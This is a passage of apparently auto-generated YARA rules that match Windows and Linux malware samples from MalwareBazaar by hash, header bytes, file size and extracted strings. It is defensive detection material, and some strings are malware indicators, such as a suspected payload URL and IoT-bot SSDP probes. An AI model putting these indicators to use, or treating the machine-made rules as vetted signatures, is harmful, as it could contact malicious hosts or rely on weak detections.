        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17170KB
        and all of them
}

rule Windows_e5bbcc08742357941d284511b0a7e9528ccc6a7bb9fa8d544cadf2b97f19e8da
{
    meta:
        description = "Auto ML: e5bbcc08742357941d284511b0a7e9528ccc6a7bb9fa8d544cadf2b97f19e8da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB
        and all of them
}

rule Windows_e5ceb36a479f4affece79593a04374e43b3619ab38e64b1b36a76b25a149baff
{
    meta:
        description = "Auto ML: e5ceb36a479f4affece79593a04374e43b3619ab38e64b1b36a76b25a149baff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1564KB
        and all of them
}

rule Windows_e5d737a35fb95bfbe2279f5215791c318faed984a5ceae76c96dab46d6be6990
{
    meta:
        description = "Auto ML: e5d737a35fb95bfbe2279f5215791c318faed984a5ceae76c96dab46d6be6990"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ZXIS8/"
        $s5 = "c`XGR8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5251KB
        and all of them
}

rule Windows_e5fd5bbe986493e44b2d137904fc59ec939113d953c793deb06806dbba3b138b
{
    meta:
        description = "Auto ML: e5fd5bbe986493e44b2d137904fc59ec939113d953c793deb06806dbba3b138b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 522KB
        and all of them
}

rule Windows_e5feb57c693a717e60b49100052433cddaa0bc787def83db90dcd04e0c1db67d
{
    meta:
        description = "Auto ML: e5feb57c693a717e60b49100052433cddaa0bc787def83db90dcd04e0c1db67d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ".adata"
        $s3 = "f;X=gY'0"
        $s4 = "$x0(yDp"
        $s5 = "uw5qVu"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1096KB
        and all of them
}

rule Windows_15fea9eac12da70b8e5bca9f6135985426506df8b08585af0ce4b438abde78f6
{
    meta:
        description = "Auto ML: 15fea9eac12da70b8e5bca9f6135985426506df8b08585af0ce4b438abde78f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6619KB
        and all of them
}

rule Linux_e5ff2d440b6a72f5afbee8734166221aaf365fbc210270d4f9482609d15ca683
{
    meta:
        description = "Auto ML: e5ff2d440b6a72f5afbee8734166221aaf365fbc210270d4f9482609d15ca683"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "JSV/+s\""
        $s2 = ">kx?nk"
        $s3 = "+Kv{Kw)M"
        $s4 = "yh8#9rq"
        $s5 = "f0vW8C"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_e6032f19912376cf1309dd2586a98236bae532e2e0f50be16d13d515727d0196
{
    meta:
        description = "Auto ML: e6032f19912376cf1309dd2586a98236bae532e2e0f50be16d13d515727d0196"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 906KB
        and all of them
}

rule Windows_e62c9dfca29286701a32906b8224fcb23feac091e9f1c834e000ff8c0cb84b88
{
    meta:
        description = "Auto ML: e62c9dfca29286701a32906b8224fcb23feac091e9f1c834e000ff8c0cb84b88"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".zecaga"
        $s5 = ".xosava"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 233KB
        and all of them
}

rule Linux_e63d0ea1b148014f7c74a948ba34bd6cac4244fb0ee87e6f4035312e106254b7
{
    meta:
        description = "Auto ML: e63d0ea1b148014f7c74a948ba34bd6cac4244fb0ee87e6f4035312e106254b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "B3g9!)G,b"
        $s3 = "Q8# bsk"
        $s4 = "/s`miCWDX"
        $s5 = "t@bsa9'"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Linux_e669148a04ee9c8dedd097123812c0c77dfa7f232d0bdc652914e8b744e8038c
{
    meta:
        description = "Auto ML: e669148a04ee9c8dedd097123812c0c77dfa7f232d0bdc652914e8b744e8038c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB
        and all of them
}

rule Linux_e66a994abbc096d375e249f63e3374856b0021acef9a662d1a100b1d02f74c85
{
    meta:
        description = "Auto ML: e66a994abbc096d375e249f63e3374856b0021acef9a662d1a100b1d02f74c85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = "Rvz4M1w"
        $s3 = "Cq@\\On"
        $s4 = "^HuUi}"
        $s5 = "O]jp#e`"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_e6aa74189e7f0e76c61715f31439a43360b3b66f86e899b3c621c817298623d0
{
    meta:
        description = "Auto ML: e6aa74189e7f0e76c61715f31439a43360b3b66f86e899b3c621c817298623d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "u>ht~B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 348KB
        and all of them
}

rule Windows_e6e106a5206be28f2b76c0190d3c1ba85d4f4bf759babd66c64d9a17a4219ddb
{
    meta:
        description = "Auto ML: e6e106a5206be28f2b76c0190d3c1ba85d4f4bf759babd66c64d9a17a4219ddb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PQh(/B"
        $s5 = "jXhp1B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_e6e1106fec7137b46da15bdd0853b1b9a6104bce649a24145793e4d451261c6b
{
    meta:
        description = "Auto ML: e6e1106fec7137b46da15bdd0853b1b9a6104bce649a24145793e4d451261c6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "nJ:*nK"
        $s3 = "nJ:*lK"
        $s4 = "nJRich"
        $s5 = "y(QyPM\""

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 800KB
        and all of them
}

rule Linux_e6e8f9c514a81f8297958f07a86d1f95d4b5b92307cb837a4ac8c4d1120e8c72
{
    meta:
        description = "Auto ML: e6e8f9c514a81f8297958f07a86d1f95d4b5b92307cb837a4ac8c4d1120e8c72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Q vAb"
        $s2 = "WSmTxY"
        $s3 = "laNtNp"
        $s4 = "T_hKT$$"
        $s5 = "XSVVS)g*IKH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_16267dd392fbffa74f3212173518202de9863e6ab7e9fc9482e780ad240b01d2
{
    meta:
        description = "Auto ML: 16267dd392fbffa74f3212173518202de9863e6ab7e9fc9482e780ad240b01d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_e7236fe777e772afa5fe027e6013318ae8724059ee3d05101771d4528e7fc5b6
{
    meta:
        description = "Auto ML: e7236fe777e772afa5fe027e6013318ae8724059ee3d05101771d4528e7fc5b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1257KB
        and all of them
}

rule Windows_e7258b68c24a165c0c61f1fe16a15dd642cf118eae9a4405d3d3cee174d1c72e
{
    meta:
        description = "Auto ML: e7258b68c24a165c0c61f1fe16a15dd642cf118eae9a4405d3d3cee174d1c72e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5854KB
        and all of them
}

rule Windows_e72ab72a888f6ef0627bb1ea5452a168792d1dc4037b74c34cc557eb5d2fe000
{
    meta:
        description = "Auto ML: e72ab72a888f6ef0627bb1ea5452a168792d1dc4037b74c34cc557eb5d2fe000"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "__StaticArrayInitTypeSize=400"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 653KB
        and all of them
}

rule Linux_e766d38ae0ec1ce75fc05559c73f66cd5a66040296d89f8608a0a21034e9f59a
{
    meta:
        description = "Auto ML: e766d38ae0ec1ce75fc05559c73f66cd5a66040296d89f8608a0a21034e9f59a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "0123456789abcdef"
        $s4 = "/proc/%d/exe"
        $s5 = "/proc/%d/stat"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB
        and all of them
}

rule Windows_e7880ebcc97729c41e3e537f4b9b61f8e24c9b0f257805855e26e89f70edecd9
{
    meta:
        description = "Auto ML: e7880ebcc97729c41e3e537f4b9b61f8e24c9b0f257805855e26e89f70edecd9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 27KB
        and all of them
}

rule Windows_e7d05102c4737019c554a7d3238ba9654c0e09d0e76590cf8c6f8fe3038d07b4
{
    meta:
        description = "Auto ML: e7d05102c4737019c554a7d3238ba9654c0e09d0e76590cf8c6f8fe3038d07b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Xffefeeffefe"
        $s5 = "affefeeffeefa"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17KB
        and all of them
}

rule Windows_e7feb941ec0838dac58cf9cd48699ac60252001dc98ebd09f357cb14985d6398
{
    meta:
        description = "Auto ML: e7feb941ec0838dac58cf9cd48699ac60252001dc98ebd09f357cb14985d6398"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "XZ$G)e"
        $s5 = "XiHQR<"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2346KB
        and all of them
}

rule Windows_e83a5ef9af52b5f878238e652094c5470adf518ea914cdf2802d377ad812e08f
{
    meta:
        description = "Auto ML: e83a5ef9af52b5f878238e652094c5470adf518ea914cdf2802d377ad812e08f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "'!TX'!PX"
        $s2 = "d!MZ4Da"
        $s3 = "d/mRd-5"
        $s4 = "SX!TS^"
        $s5 = "/mFd!M"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB
        and all of them
}

rule Windows_e84d658c4489812aa7c0fc44e8ce1832427f201c5c40872f160238eb3af31a75
{
    meta:
        description = "Auto ML: e84d658c4489812aa7c0fc44e8ce1832427f201c5c40872f160238eb3af31a75"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "W=w4IO"
        $s5 = "/i>H/VSI"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB
        and all of them
}

rule Windows_e872ec40a4c2ca42b1330b6b6332ac44705ec697432c901aa39e93edb7765531
{
    meta:
        description = "Auto ML: e872ec40a4c2ca42b1330b6b6332ac44705ec697432c901aa39e93edb7765531"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "\\Microsoft\\Network\\Connections"
        $s5 = "https://clfeed.online/keyfileupdate/rst32.jpg"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10KB
        and all of them
}

rule Linux_164e9826d76a4614e525719487ec5ba06d4d4fd22b2339577af3683b50045d0b
{
    meta:
        description = "Auto ML: 164e9826d76a4614e525719487ec5ba06d4d4fd22b2339577af3683b50045d0b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:PPj"
        $s2 = "C)QQWP"
        $s3 = "D$$PSV"
        $s4 = "xAPPSh"
        $s5 = "u%WWSS"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Linux_e8884be11c02bfb630f1e52b9f062f816e98cea492d05378f72fb496ca029c32
{
    meta:
        description = "Auto ML: e8884be11c02bfb630f1e52b9f062f816e98cea492d05378f72fb496ca029c32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "eUPX!`"
        $s2 = "aK&=EN"
        $s3 = "iSt#g1N+I"
        $s4 = "lB\\^'GZ"
        $s5 = "%<qnTKG2"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB
        and all of them
}

rule Windows_e8a8103e86118016856e61ab2cf1e0c75235d87b76302bce2537a14d9b0c04a1
{
    meta:
        description = "Auto ML: e8a8103e86118016856e61ab2cf1e0c75235d87b76302bce2537a14d9b0c04a1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 332KB
        and all of them
}

rule Windows_e8af36287e2270581fd5f2d28c6e0b83b337f58d430554d28dbf55d2ca09fcca
{
    meta:
        description = "Auto ML: e8af36287e2270581fd5f2d28c6e0b83b337f58d430554d28dbf55d2ca09fcca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff%"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 18457KB
        and all of them
}

rule Windows_e8b221cba5c3598522f1ebd2b5e52b2f45699a1965b5dd677a9b9d074677873e
{
    meta:
        description = "Auto ML: e8b221cba5c3598522f1ebd2b5e52b2f45699a1965b5dd677a9b9d074677873e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1662KB
        and all of them
}

rule Windows_e8e307f94d9319f62b20920b93bec8ad8fad2341a3fa1d072a0cd8257295d881
{
    meta:
        description = "Auto ML: e8e307f94d9319f62b20920b93bec8ad8fad2341a3fa1d072a0cd8257295d881"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1881KB
        and all of them
}

rule Linux_e8e428592478d9ed2e5baa70d7cf6e8d9a89f8d9d6942c1178b806b4cb5888ca
{
    meta:
        description = "Auto ML: e8e428592478d9ed2e5baa70d7cf6e8d9a89f8d9d6942c1178b806b4cb5888ca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ",N^NuNV"
        $s2 = "pN^NuNV"
        $s3 = "N^NuNV"
        $s4 = "OHWHQHy"
        $s5 = "LNqNuO"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 169KB
        and all of them
}

rule Linux_e8fe0f983eaf27b565d681b5edd1775eafeb98bb5742d6976aaf176aaa13befb
{
    meta:
        description = "Auto ML: e8fe0f983eaf27b565d681b5edd1775eafeb98bb5742d6976aaf176aaa13befb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:WWj"
        $s2 = ";|$(t:PPj"
        $s3 = "D$$PSV"
        $s4 = "xAPPSh@t"
        $s5 = "\\$ThpQ"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Windows_e909f6d833125f008ea789af8fdfb40041c2fecbca437a8f0da7e289efbebe89
{
    meta:
        description = "Auto ML: e909f6d833125f008ea789af8fdfb40041c2fecbca437a8f0da7e289efbebe89"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Calculate>b__0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 653KB
        and all of them
}

rule Windows_e96703038fcb644285ae23b1e3e71b39dbe1252f6aeeb1c3d963c285703a7ad8
{
    meta:
        description = "Auto ML: e96703038fcb644285ae23b1e3e71b39dbe1252f6aeeb1c3d963c285703a7ad8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PQh(/B"
        $s5 = "jXhp1B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_e96e988d061758a49d60b1240dc7fac645c42e698231ce85aac89eb23facd866
{
    meta:
        description = "Auto ML: e96e988d061758a49d60b1240dc7fac645c42e698231ce85aac89eb23facd866"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.hyperme"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17181KB
        and all of them
}

rule Windows_1657a01593f2f519b59e0b94007cf1909940ded07bb6022bf4f39be173a64b61
{
    meta:
        description = "Auto ML: 1657a01593f2f519b59e0b94007cf1909940ded07bb6022bf4f39be173a64b61"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 664KB
        and all of them
}

rule Windows_e9784ddc7220f06d1543b7b1fe22c05d70599204e62c39b935bb93f670ab8a88
{
    meta:
        description = "Auto ML: e9784ddc7220f06d1543b7b1fe22c05d70599204e62c39b935bb93f670ab8a88"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "dSiz%PDF-"
        $s5 = "Qkkbal"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8960KB
        and all of them
}

rule Windows_e98d3352f1529d8ac7ba663df506f4db64bed2471ef3cb7831eda8fb61868f35
{
    meta:
        description = "Auto ML: e98d3352f1529d8ac7ba663df506f4db64bed2471ef3cb7831eda8fb61868f35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "_VVVVV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 731KB
        and all of them
}

rule Windows_e9da8094392d8124c615595ebabc8e3ce15c94922c7f5540e12974eee9113a86
{
    meta:
        description = "Auto ML: e9da8094392d8124c615595ebabc8e3ce15c94922c7f5540e12974eee9113a86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 631KB
        and all of them
}

rule Windows_e9dca9a5faee679c0262540243c40a9c62d21ce491c93cbf15059db98f18f22c
{
    meta:
        description = "Auto ML: e9dca9a5faee679c0262540243c40a9c62d21ce491c93cbf15059db98f18f22c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6618KB
        and all of them
}

rule Linux_e9dde263d548e82af911eed5cc8331ebad4c66e267815939816cda7b6972c9db
{
    meta:
        description = "Auto ML: e9dde263d548e82af911eed5cc8331ebad4c66e267815939816cda7b6972c9db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB
        and all of them
}

rule Windows_e9e605bf0298e0e2374188893b63868c1926c7997f4e257e8ea91ddcfd315b6f
{
    meta:
        description = "Auto ML: e9e605bf0298e0e2374188893b63868c1926c7997f4e257e8ea91ddcfd315b6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "O ufaFY"
        $s5 = "a .ww<a}"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1420KB
        and all of them
}

rule Windows_ea040833f500c29fb2229a00c1578500c65fffddab8eea70083ef392cc066bc4
{
    meta:
        description = "Auto ML: ea040833f500c29fb2229a00c1578500c65fffddab8eea70083ef392cc066bc4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".royeg"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_ea07e8062d246770a4e005383f07009ea465801f429ebedf6e4fc0667ec143b1
{
    meta:
        description = "Auto ML: ea07e8062d246770a4e005383f07009ea465801f429ebedf6e4fc0667ec143b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2588KB
        and all of them
}

rule Windows_ea0ac7277d0fdf801972b56bdc57184fc51ac8be47438873396436736f3694a9
{
    meta:
        description = "Auto ML: ea0ac7277d0fdf801972b56bdc57184fc51ac8be47438873396436736f3694a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.managed"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_ea0e1edd416c2080d13fffc20ab4648156e4acf792d13f2dd9286a0a2b7bdc0a
{
    meta:
        description = "Auto ML: ea0e1edd416c2080d13fffc20ab4648156e4acf792d13f2dd9286a0a2b7bdc0a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
